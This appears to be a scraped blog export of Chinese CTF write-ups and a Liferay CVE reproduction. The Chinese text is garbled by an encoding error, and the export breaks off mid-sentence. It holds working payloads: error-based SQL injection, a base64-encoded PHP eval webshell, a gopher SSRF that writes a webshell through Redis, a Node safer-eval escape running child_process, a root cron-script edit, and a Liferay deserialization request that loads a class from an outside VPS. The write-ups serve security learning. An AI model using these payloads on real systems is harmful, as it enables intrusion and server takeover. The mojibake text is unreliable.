æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¤šçº¿ç¨‹å¹¶å‘çš„è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ€»ä¼šæœ‰ä¸€æ¬¡åœ¨ä¸Šä¼ æ–‡ä»¶åˆ°åˆ é™¤æ–‡ä»¶è¿™ä¸ªæ—¶é—´æ®µå†…è®¿é—®åˆ°ä¸Šä¼ çš„phpæ–‡ä»¶ï¼Œä¸€æ—¦æˆ‘ä»¬æˆåŠŸè®¿é—®åˆ°äº†ä¸Šä¼ çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šå‘æœåŠ¡å™¨å†™ä¸€ä¸ªshellã€‚\nå›åˆ°é¢˜ç›® æ‰“å¼€é¢˜ç›®ï¼Œæ˜¾ç¤ºè´¦æˆ·å‰©ä½™20å…ƒï¼Œflagéœ€è¦21å…ƒï¼Œç„¶åä½ å¯ä»¥è¾“å…¥å°äºç­‰äº20å…ƒçš„é‡‘é¢ï¼Œå¦å¤–æœ‰ä¸ªé‡ç½®æŒ‰é’®\næ€è·¯å°±æ˜¯åˆ†åˆ«æŠ“ä¸¤ä¸ªåŒ…ï¼Œä¸€ä¸ªä¸åœçš„æ”¯ä»˜20å…ƒï¼Œä¸€ä¸ªä¸åœçš„é‡ç½®ï¼Œåœ¨é«˜å¹¶å‘çš„æƒ…å†µä¸‹æœåŠ¡å™¨å“åº”ä¸è¿‡æ¥å°±å¯ä»¥é€ æˆæ”¯ä»˜ä¸¤æ¬¡\næ³¨æ„äº‹é¡¹å°±æ˜¯æ”¯ä»˜é‡‘é¢æœ€å¥½æ˜¯10å…ƒä»¥ä¸Šï¼Œå¦‚æœæ˜¯ä¸€ä¸¤å…ƒçš„è¯ï¼Œå°±ä¸èƒ½å’Œå¦å¤–ä¸€ä¸ªåŒ…å½¢æˆç«äº‰è¿˜æœ‰å°±æ˜¯çº¿ç¨‹è¦å¤š\nPOST / HTTP/1.1\rHost: aaaed42d.yunyansec.com\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/Â§72Â§.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 16\rOrigin: http://aaaed42d.yunyansec.com\rConnection: close\rReferer: http://aaaed42d.yunyansec.com/\rUpgrade-Insecure-Requests: 1\rmoney=20\u0026amp;submit=\rPOST / HTTP/1.1\rHost: aaaed42d.yunyansec.com\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/Â§72Â§.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 16\rOrigin: http://aaaed42d.yunyansec.com\rConnection: close\rReferer: http://aaaed42d.yunyansec.com/\rUpgrade-Insecure-Requests: 1\rmoney=\u0026amp;restart=1\rå¼€ä¸¤ä¸ªintruderï¼Œçº¿ç¨‹20ï¼Œçˆ†ç ´å‡ºflag\neasy è€ƒç‚¹ï¼šäºŒæ¬¡æ³¨å…¥\næ‰“å¼€å°±ä¸€ä¸ªæ³¨å†Œç™»å½•ç•Œé¢ï¼Œadminè´¦æˆ·å·²ç»æ³¨å†Œäº†ï¼Œç™»å½•ä¹‹åå¯ä»¥æ”¹å¯†ç ï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯è¶Šæƒï¼Œåæ¥æ”¾å‡ºäº†hintæ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œä»¥å‰å¯¹äºè¿™æ ·çš„äºŒæ¬¡æ³¨å…¥æ¯”è¾ƒé™Œç”Ÿï¼Œæ„Ÿè§‰æ­¤é¢˜è¿˜æ˜¯æœ‰ç‚¹æ„æ€\nåˆ©ç”¨æ³¨å†Œç”¨æˆ·åè¿›è¡Œsqli æ³¨å†Œè¿™é‡Œæ²¡æœ‰sqliï¼Œåœ¨æ”¹å¯†ç é‚£é‡Œæ‰å¯ä»¥è§¦å‘ï¼Œç›²çŒœæŸ¥è¯¢è¯­å¥ï¼š\nupdate XXX set password = \u0026quot;xxx\u0026quot; where username = \u0026quot;xxx\u0026quot; and (old)password = \u0026quot;xx\u0026quot;;\rhintæç¤ºäº†æ³¨å…¥ä¹‹åï¼Œåœ¨æ³¨å†Œç”¨æˆ·åé‚£é‡Œï¼Œæ³¨å†Œï¼š\nadmin\u0026quot;#\rç™»å½•è¿›å»ä¹‹åï¼Œä¿®æ”¹å¯†ç ä¸º123456ï¼Œæ”¹å®Œä¹‹åæˆ‘ä»¬å¯ä»¥ç›´æ¥123456ç™»å½•adminçš„è´¦æˆ·äº†ï¼Œè¯´æ˜æˆ‘ä»¬å·²ç»æ³¨å…¥æˆåŠŸäº†\nä½†æ˜¯åˆ°è¿™é‡Œä¸€ç­¹è«å±•ï¼Œåæ¥æ‰æƒ³åˆ°å¯ä»¥ç»§ç»­åˆ©ç”¨sqliæŸ¥ä¿¡æ¯\nåˆ©ç”¨æŠ¥é”™æ³¨å…¥æŸ¥ä¿¡æ¯ ç®€å•fuzzäº†ä¸€ä¸‹ï¼Œç©ºæ ¼ï¼Œ/**/è¿™äº›è¢«è¿‡æ»¤äº†ï¼Œupdateä¸çŸ¥é“èƒ½ä¸èƒ½unionï¼Œæˆ‘ç›´æ¥æƒ³åˆ°æŠ¥é”™æ³¨å…¥+æ‹¬å·å¥—å¨ƒ\ntest\u0026quot;||updatexml(2,concat(0x7e,(database())),0)#\r//easy\rabc\u0026quot;||updatexml(2,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)='easy')),0)#\r//article,flag,user\rabc\u0026quot;||updatexml(2,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag')),0)#\r//flag\rabc\u0026quot;||updatexml(2,concat(0x7e,(select(flag)from(flag))),0)#\r//flag{We11D0Ne_hOhO}\rå…¶å®ä¸»è¦å°±æ˜¯è¿™ä¸ªäºŒæ¬¡æ³¨å…¥æ¯”è¾ƒéš¾æƒ³åˆ°ï¼Œå­¦åˆ°è®¸å¤š\n","date":"2020-06-21T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%8E%B0%E7%A7%91ctf%E7%AB%9E%E8%B5%9B/","title":"ä¸­è®¡é‡ç°ç§‘CTFç«èµ›"},{"content":"GKCTFï¼Œé¢˜å¥½å¹³å°æ£’ï¼Œå› ä¸ºé‚£æ®µæ—¶é—´æ¯”èµ›å¤ªå¤šå°±æ²¡æ‰“ï¼Œç°åœ¨å¡«å‘\n CheckIN è€ƒç‚¹ï¼šPHP73 bypass disable_functions\næ‰“å¼€é¢˜ç›®æ˜¯æºç ï¼š\n\u0026lt;title\u0026gt;Check_In\u0026lt;/title\u0026gt;\r\u0026lt;?php\rhighlight_file(__FILE__);\rclass ClassName\r{\rpublic $code = null;\rpublic $decode = null;\rfunction __construct()\r{\r$this-\u0026gt;code = @$this-\u0026gt;x()['Ginkgo'];\r$this-\u0026gt;decode = @base64_decode( $this-\u0026gt;code );\r@Eval($this-\u0026gt;decode);\r}\rpublic function x()\r{\rreturn $_REQUEST;\r}\r}\rnew ClassName();\rç›®æ ‡å¾ˆæ˜ç¡®ï¼Œä¼ å…¥ ?Ginkgo=ï¼ˆPHPä»£ç ï¼‰ å°±å¯ä»¥RCEï¼Œæˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹ phpinfo() å‘ç°æ­£å¸¸å›æ˜¾ï¼Œä½†æ˜¯systemå´æ²¡æœ‰å›æ˜¾ã€‚\næˆ‘å…ˆæ„é€ ä¸€ä¸ªshellèšå‰‘è¿æ¥å†è¯´ï¼š?Ginkgo=ZXZhbCgkX1BPU1RbJ2NtZCddKTs= ï¼ˆ?Ginkgo=eval($_POST[\u0026lsquo;cmd\u0026rsquo;]);ï¼‰\nè¿æ¥ä¸Šä¹‹åï¼Œå¯ä»¥ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿï¼Œä½†æ˜¯è™šæ‹Ÿç»ˆç«¯å´ä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼ŒçŒœæµ‹æ˜¯disable_functionsï¼Œåœ¨phpinfoé‡Œé¢æœç„¶ç¿»åˆ°äº†\nå…³äºbypass diable_functionsï¼Œè¿™é‡Œæ¨èä¸€ç¯‡æ–‡ç« \næœ‰å››ç§ç»•è¿‡ disable_functions çš„æ‰‹æ³•ï¼š\n ç¬¬ä¸€ç§ï¼Œæ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€web åº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagick çš„é­”å›¾æ¼æ´ã€bash çš„ç ´å£³æ¼æ´ï¼› ç¬¬äºŒç§ï¼Œå¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„ popen()ã€proc_open()ã€pcntl_exec()ï¼Œé€ä¸€å°è¯•ï¼Œæˆ–è®¸æœ‰æ¼ç½‘ä¹‹é±¼ï¼› ç¬¬ä¸‰ç§ï¼Œmod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹ .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶ï¼› ç¬¬å››ç§ï¼Œåˆ©ç”¨ç¯å¢ƒå˜é‡ LD_PRELOAD åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœã€‚  è¿™é‡Œç”¨çš„ä¸€ä¸ªbypass PHP7.0-7.3 disable_functionçš„PoCï¼Œç”¨èšå‰‘ä¸Šä¼ åˆ°/tmpï¼ŒindexåŒ…å«ä»–å°±å¯ä»¥çœ‹åˆ°ç»“æœäº†\ncveç‰ˆç­¾åˆ° è€ƒç‚¹ï¼šcve-2020-7066\nCVE-2020-7066 åœ¨ä½äº7.2.29çš„PHPç‰ˆæœ¬7.2.xï¼Œä½äº7.3.16çš„7.3.xå’Œä½äº7.4.4çš„7.4.xä¸­ï¼Œå°† get_headers() ä¸ç”¨æˆ·æä¾›çš„URLä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå¦‚æœURLåŒ…å«é›¶ï¼ˆ\\ 0ï¼‰å­—ç¬¦ï¼ˆä¸å¯è§å­—ç¬¦ï¼‰ï¼Œåˆ™URLå°†è¢«é™é»˜åœ°æˆªæ–­ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´æŸäº›è½¯ä»¶å¯¹ get_headers() çš„ç›®æ ‡åšå‡ºé”™è¯¯çš„å‡è®¾ï¼Œå¹¶å¯èƒ½å°†æŸäº›ä¿¡æ¯å‘é€åˆ°é”™è¯¯çš„æœåŠ¡å™¨ã€‚\npayload ?url=http://127.0.0.1%00\\.ctfhub.com\rå¾—åˆ°ä¸€ä¸ªhintï¼š Tips: Host must be end with '123'\n?url=http://127.0.0.123%00\\.ctfhub.com\rflag{1608cce2-94d1-4014-9927-a9738ea8280e}\nè€å…«å°è¶…å¸‚å„¿ è€ƒç‚¹ï¼šshopxoåå°å¼±å£ä»¤ï¼Œå®‰è£…ä¸»é¢˜Getshellï¼Œå®šæ—¶è„šæœ¬åˆ©ç”¨\næ‰“å¼€é¡µé¢ï¼Œåœ¨é¡µè„šå‘ç°ä¸€è¡Œè¯ï¼š Powered by ShopXO v1.8.0\nå¯¹äºShopXOè¿™ä¸ªæ¡†æ¶ï¼Œç½‘ä¸Šå¤§è‡´ä¸‰ç§åˆ©ç”¨æ–¹æ³•ï¼šCVE-2019-5886/7 ï¼Œ åå°å¼±å£ä»¤\nå¼±å£ä»¤ è®¿é—® admin.php ï¼Œç”¨æˆ·å admin å¯†ç  shopxo å°±è¿›å»äº†ã€‚ã€‚ã€‚\nåå°åˆ©ç”¨ä¸»é¢˜å®‰è£…Getshell æ¥åˆ°ç½‘ç«™ç®¡ç†åå°ï¼Œåœ¨ åº”ç”¨ä¸­å¿ƒ -\u0026gt; åº”ç”¨å•†åº— -\u0026gt; ä¸»é¢˜ é‡Œé¢å¯ä»¥ä¸‹è½½ä¸»é¢˜æ–‡ä»¶åˆ°æœ¬åœ°\nç„¶ååœ¨ ç½‘ç«™ç®¡ç† -\u0026gt; ä¸»é¢˜ç®¡ç† -\u0026gt; ä¸»é¢˜å®‰è£… é€šè¿‡ä¸Šä¼ å«æœ‰webshellçš„ä¸»é¢˜æ¥è·å–ä¸€ä¸ªwebshell\nF12å¯ä»¥çœ‹åˆ°shellçš„è·¯å¾„ï¼š è®¿é—®å‘ç°é¡µé¢å­˜åœ¨ï¼Œç›´æ¥èšå‰‘è¿æ¥ï¼›\nåˆ©ç”¨å®šæ—¶æ–‡ä»¶rootæƒé™è¯»å–flag åœ¨æ ¹ç›®å½•å‘ç°å‡çš„flagï¼Œæ—è¾¹flag.hint\nå‘ç°æ¯åˆ†é’Ÿå†…å®¹éƒ½ä¼šå˜ä¸€æ¬¡ï¼Œç„¶åæ‰¾åˆ°äº†æ ¹ç›®å½•çš„auto.sh\nç›´æ¥è®¿é—®è¿™ä¸ªpyæ–‡ä»¶ï¼š\nimport os\rimport io\rimport time\ros.system(\u0026quot;whoami\u0026quot;) gk1=str(time.ctime())\rgk=\u0026quot;\\nGet the Root,The Date Is Userful!\u0026quot;\rf=io.open(\u0026quot;/flag.hint\u0026quot;, \u0026quot;rb+\u0026quot;)\rf.write(str(gk1))\rf.write(str(gk))\rf.close()\rçŒœæµ‹è¿™ä¸ªpyæ–‡ä»¶çš„æƒé™æ¯”è¾ƒé«˜ï¼Œå¯ä»¥è¯»å–/root/flagï¼Œäºæ˜¯ç›´æ¥åŠ ä¸¤è¡Œï¼š\nimport os\rimport io\rimport time\ros.system(\u0026quot;whoami\u0026quot;) gk1=str(time.ctime())\rgk=\u0026quot;shit\\n\u0026quot;\rf=io.open(\u0026quot;/flag.hint\u0026quot;, \u0026quot;rb+\u0026quot;)\r#s=open(\u0026quot;/root/flag\u0026quot;,\u0026quot;r\u0026quot;).read()\rs=os.system(\u0026quot;cat /root/*|grep 'flag'\u0026quot;)\rf.write(s)\rf.write(str(gk1))\rf.write(str(gk))\rf.close()\réš”ä¸€ä¼šå„¿è®¿é—®/flag.hintå°±æœ‰flagï¼š\nEZä¸‰å‰‘å®¢-EzWeb è€ƒç‚¹ï¼šSSRFï¼Œfileå…³é”®å­—ç»•è¿‡ï¼Œgopheråè®®æ‰“redisæœªæˆæƒï¼Œrediså†™webshell\nSSRFå­¦ä¹ é“¾æ¥\u0026raquo;https://hackmd.io/@Lhaihai/H1B8PJ9hX\næ‰“å¼€æ˜¯ä¸€ä¸ªæäº¤URLçš„é¡µé¢ï¼Œè¾“å…¥127.0.0.1ä¼šå›æ˜¾\u0026quot;åˆ«è¿™æ ·\u0026quot;ï¼Œç›²çŒœSSRFï¼›\nåˆ©ç”¨fileåè®®å°è¯•è¯»å–æœ¬æœºæ–‡ä»¶ file:///etc/passwd\rå›æ˜¾\u0026quot;åˆ«è¿™æ ·\u0026quot;ï¼›\nå¯ä»¥åˆ©ç”¨ file:/etc/passwd ç»•è¿‡\nè¯»å–indexæºç ï¼š\nfile:/var/www/html/index.php\rå¾—åˆ°ï¼š\nfunction curl($url){ $ch = curl_init();\rcurl_setopt($ch, CURLOPT_URL, $url);\rcurl_setopt($ch, CURLOPT_HEADER, 0);\recho curl_exec($ch);\rcurl_close($ch);\r}\rif(isset($_GET['submit'])){\r$url = $_GET['url'];\r//echo $url.\u0026quot;\\n\u0026quot;;\rif(preg_match('/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is', $url,$match))\r{\r//var_dump($match);\rdie('åˆ«è¿™æ ·');\r}\rcurl($url);\r}\rif(isset($_GET['secret'])){\rsystem('ifconfig');\r}\r?\u0026gt;\rå¯ä»¥çœ‹åˆ°ï¼Œç¡®å®æ˜¯banæ‰äº†file:// dict ç­‰å…³é”®å­—ã€‚\nä½†æ˜¯flagè²Œä¼¼å¹¶ä¸åœ¨è¿™å°æœºå™¨ä¸Šé¢ï¼›\nè¯»å–/etc/hostså’Œ/proc/net/arpæ–‡ä»¶ä¹‹åéƒ½æ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œifconfigå›æ˜¾é‡Œé¢ç»™å‡ºäº†æœ¬æœºçš„å†…ç½‘ipï¼Œäºæ˜¯å»å°è¯•çˆ†ç ´Cæ®µï¼›\nåˆ©ç”¨bpçš„intruderæ¨¡å—çˆ†ç ´Cæ®µ å‘åˆ°intruderï¼Œè®¾ç½®Positionå’ŒPayloadï¼Œåœ¨xx.xx.xx.11å‘ç°äº†å›æ˜¾ï¼š\nç»§ç»­å°è¯•çˆ†ç ´ç«¯å£ï¼Œå‘ç°6379çš„redisæŠ¥é”™ï¼ˆå…¶å®çŒœä¹Ÿèƒ½çŒœï¼Œä¸€èˆ¬å°±æ˜¯3306å’Œ6379ï¼‰\nåˆ©ç”¨gopheråè®®æ‰“å†…ç½‘æœªæˆæƒredis ä¹‹å‰è¯´è¿‡banäº†dictï¼Œæˆ‘ä»¬è¿™é‡Œè¿˜æœ‰gopheråè®®ï¼›\nç›´æ¥å¾€webè·¯å¾„å†™shellï¼š\ngopher://173.169.113.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A\rç›´æ¥å‰ç«¯æäº¤ï¼š\n173.169.113.11/shell.php?cmd=cat%20/flag\rå¾—åˆ°flag\n[GKCTF2020]EZä¸‰å‰‘å®¢-EzNode è€ƒç‚¹ï¼šNodeJså®¡è®¡ã€settimeoutå‡½æ•°æ¼æ´\nå‚è€ƒ\u0026raquo;Guokeå¸ˆå‚…\næ‰“å¼€é¡µé¢æ˜¯ä¸ªè®¡ç®—å™¨ï¼Œç»™äº†æºç ï¼š\nconst express = require('express');\rconst bodyParser = require('body-parser');\rconst saferEval = require('safer-eval'); // 2019.7/WORKER1 æ‰¾åˆ°ä¸€ä¸ªå¾ˆæ£’çš„åº“\rconst fs = require('fs');\rconst app = express();\rapp.use(bodyParser.urlencoded({ extended: false }));\rapp.use(bodyParser.json());\r// 2020.1/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–\rapp.use((req, res, next) =\u0026gt; {\rif (req.path === '/eval') {//å¦‚æœè¯·æ±‚è·¯å¾„æ˜¯/evalï¼Œå°±æ‰§è¡Œ\rlet delay = 60 * 1000;//å®šä¹‰ä¸€ä¸ªå˜é‡delay\rconsole.log(delay);\rif (Number.isInteger(parseInt(req.query.delay))) {//å¦‚æœè¯·æ±‚å‚æ•°delayæ˜¯æ•´æ•°ï¼Œå°±æŠŠä¼ å…¥çš„å’Œä¹‹å‰å®šä¹‰å–æœ€å¤§å€¼å¤åˆ¶ç»™delay\rdelay = Math.max(delay, parseInt(req.query.delay));\r}\rconst t = setTimeout(() =\u0026gt; next(), delay);//è®¾ç½®è¶…æ—¶ï¼Œå¦‚æœè¶…æ—¶å°±è¿›å…¥ä¸‹ä¸€ä¸ªè·¯ç”±\r// 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹\rsetTimeout(() =\u0026gt; {\rclearTimeout(t);\rconsole.log('timeout');\rtry {\rres.send('Timeout!');\r} catch (e) {\r}\r}, 1000);//è¶…æ—¶ä¸€ç§’å°±å°±æ‰§è¡Œtimeout\r} else {\rnext();\r}\r});\rapp.post('/eval', function (req, res) {\rlet response = '';\rif (req.body.e) {\rtry {\rresponse = saferEval(req.body.e);//å¯æ‰§è¡Œæ¶æ„ä»£ç \r} catch (e) {\rresponse = 'Wrong Wrong Wrong!!!!';\r}\r}\rres.send(String(response));\r});\r// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI\rapp.get('/source', function (req, res) {\rres.set('Content-Type', 'text/javascript;charset=utf-8');\rres.send(fs.readFileSync('./index.js'));\r});\r// 2019.12/WORKER3 ä¸ºäº†æ–¹ä¾¿æˆ‘è‡ªå·±æŸ¥çœ‹ç‰ˆæœ¬ï¼ŒåŠ ä¸Šè¿™ä¸ªæ¥å£\rapp.get('/version', function (req, res) {\rres.set('Content-Type', 'text/json;charset=utf-8');\rres.send(fs.readFileSync('./package.json'));\r});\rapp.get('/', function (req, res) {\rres.set('Content-Type', 'text/html;charset=utf-8');\rres.send(fs.readFileSync('./index.html'))\r})\rapp.listen(80, '0.0.0.0', () =\u0026gt; {\rconsole.log('Start listening')\r});\rä¸»è¦å°±æ˜¯è¦çœ‹æ‡‚ä»£ç ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ï¼š\næˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªdelayå’ŒåŸæ¥çš„delayæ¯”è¾ƒï¼Œå–æœ€å¤§å€¼ï¼Œç„¶åä½œä¸ºå½¢å‚ä¼ ç»™timeoutè¿™ä¸ªå‡½æ•°ï¼Œå¦‚æœä»£ç æ‰§è¡Œçš„æ—¶é—´è¶…è¿‡äº†è¿™ä¸ªå€¼ï¼Œå°±æ‰§è¡Œevalï¼›\né—®é¢˜å°±å‡ºåœ¨è¿™ä¸ªsettimeoutå‡½æ•°ä¸Šã€‚\nintergerè¶…è¿‡2147483647å¯ä»¥ä½¿intæº¢å‡º è¿™é‡Œå€Ÿç”¨Guokeå¸ˆå‚…çš„ä¸€å¼ å›¾ï¼š\næ²™ç®±é€ƒé€¸ï¼ŒåŸå‹é“¾æ±¡æŸ“ https://xz.aliyun.com/t/7842\nGETä¼ å…¥ï¼š\n?delay=2147483648\rPOSTï¼š\ne=clearImmediate.constructor(\u0026quot;return process;\u0026quot;)().mainModule.require(\u0026quot;child_process\u0026quot;).execSync(\u0026quot;cat /flag\u0026quot;).toString()\rå¾—åˆ°flagï¼›\nflag{e8e4454d-c127-4caf-89e2-86e266c83aa1}\n","date":"2020-06-20T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/gkctf2020%E5%A4%8D%E7%8E%B0/","title":"GKCTF2020å¤ç°"},{"content":"æ¼æ´è¯´æ˜ Liferayæ˜¯ä¸€ä¸ªå¼€æºçš„Portaläº§å“,æä¾›å¯¹å¤šä¸ªç‹¬ç«‹ç³»ç»Ÿçš„å†…å®¹é›†æˆ,ä¸ºä¼ä¸šä¿¡æ¯ã€æµç¨‹ç­‰çš„æ•´åˆæä¾›äº†ä¸€å¥—å®Œæ•´çš„è§£å†³æ–¹æ¡ˆ,å’Œå…¶ä»–å•†ä¸šäº§å“ç›¸æ¯”,Liferayæœ‰ç€å¾ˆå¤šä¼˜è‰¯çš„ç‰¹æ€§,è€Œä¸”å…è´¹,åœ¨å…¨çƒéƒ½æœ‰è¾ƒå¤šç”¨æˆ·ã€‚è¯¥æ¼æ´æ˜¯ä¸ªååºåˆ—åŒ–å¯¼è‡´çš„RCEï¼Œé€šè¿‡æœªæˆæƒè®¿é—®å…¶apiä¼ é€’jsonæ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œå±å®³è¾ƒé«˜\nå½±å“èŒƒå›´ Liferay Portal 6.1ã€6.2ã€7.0ã€7.1ã€7.2\nç¯å¢ƒæ­å»º æ¼æ´ç¯å¢ƒï¼š\nwindows 10\njre1.8.0_221\njdk1.8.0_221\ntomcaté›†æˆåŒ…ï¼šhttps://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1 ï¼ˆæˆ‘ç”¨çš„liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.tar.gzï¼‰\nå¯åŠ¨ç¯å¢ƒ E:\\tmp\\liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761\\liferay-portal-7.2.0-ga1\\tomcat-9.0.17\\bin\u0026gt; .\\catalina.bat run\rè®¿é—® http://localhost:8080/ å…¨éƒ¨é»˜è®¤é…ç½®å°±å¯ä»¥\næ¼æ´åˆ©ç”¨ æ€è·¯ï¼šæ„é€ æ¶æ„classæ–‡ä»¶-\u0026gt;æ„é€ åºåˆ—åŒ–-\u0026gt;ååºåˆ—åŒ–-\u0026gt;åŠ è½½VPSä¸Šé¢æ¶æ„evil.classæ–‡ä»¶-\u0026gt;å®ç°ä¸‹è½½webshell\næ„é€ æ¶æ„classæ–‡ä»¶ åœ¨VPSä¸Šé¢åˆ›å»º LifExp.javaï¼ˆè¯¥å†™æ³•ä¸ºç›®æ ‡æ˜¯Windowsï¼Œè¿è¡Œè®¡ç®—å™¨ï¼‰-\u0026gt;ç¼–è¯‘classæ–‡ä»¶\npublic class LifExp { static { try { String[] cmd = {\u0026quot;cmd.exe\u0026quot;, \u0026quot;/c\u0026quot;, \u0026quot;calc.exe\u0026quot;};//å‘½ä»¤æ‰§è¡Œ\rjava.lang.Runtime.getRuntime().\rexec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } }\rä½¿ç”¨ javac .\\LifExp.java ç”Ÿæˆclassæ–‡ä»¶\nåœ¨å½“å‰ç›®å½•ä½¿ç”¨ python -m SimpleHTTPServer 8000 ç›‘å¬8000ç«¯å£å¯åŠ¨ä¸€ä¸ªwbeæœåŠ¡\næ„é€ åºåˆ—åŒ– ä½¿ç”¨ marshalsec-0.0.3-SNAPSHOT-all.jar æ–‡ä»¶è¿›è¡Œåºåˆ—åŒ–ï¼š\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://ä½ çš„IP:ä½ çš„ç«¯å£/ LifExp\ræ„é€ HTTPæ•°æ®åŒ… æŠŠ defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource= åé¢çš„å€¼æ›¿æ¢ä¸ºä¸Šé¢é€‰ä¸­éƒ¨åˆ†\nPOST /api/jsonws/invoke HTTP/1.1\rHost: 192.168.207.133:8080\rContent-Length: 1365\rContent-Type: application/x-www-form-urlencoded\rConnection: close\rcmd={\u0026quot;/expandocolumn/add-column\u0026quot;:{}}\u0026amp;p_auth=o3lt8q1F\u0026amp;formDate=1585270368703\u0026amp;tableId=1\u0026amp;name=2\u0026amp;type=3\u0026amp;defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={\u0026quot;userOverridesAsString\u0026quot;:\u0026quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c6966457870740019687474703a2f2f35392e3131302e3135372e343a383030302f740003466f6f;\u0026quot;}\rå‘åŒ…ï¼Œä¸å‡ºæ„å¤–ä¼šè¿”å›500\nä½†æ˜¯è®¡ç®—å™¨æ˜¯å¼¹å‡ºæ¥äº†ï¼›\nåˆ«çœ‹ä»–åªæ˜¯ä¸€ä¸ªå°å°çš„è®¡ç®—å™¨ï¼Œä½†æ˜¯ä»–çš„å¨åŠ›æ˜¯æ— ç©·çš„ï¼Œå› ä¸ºä½ 